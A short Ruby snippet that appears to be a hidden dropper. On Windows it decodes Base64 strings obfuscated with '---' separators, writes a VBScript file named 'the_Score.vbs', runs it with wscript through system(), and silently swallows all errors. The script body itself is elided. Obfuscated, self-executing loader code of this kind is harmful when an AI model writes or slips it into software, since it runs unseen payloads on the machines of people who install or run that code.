begin
  os = RbConfig::CONFIG['host_os']
 
  if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
      vbs_out = "RGltIG9ialdTSCxv---...---IA0K"
      content = Base64.decode64(vbs_out.gsub("---", ""))
      File.open("the_Score.vbs", "w") { |file| file.write(content) }
      cmd = "d3Nj---cmlwdCB0---aGVfU2NvcmUud---mJz".gsub("---", "")
      decoded_cmd = Base64.decode64(cmd)
      system(decoded_cmd)
  end
rescue => e
end
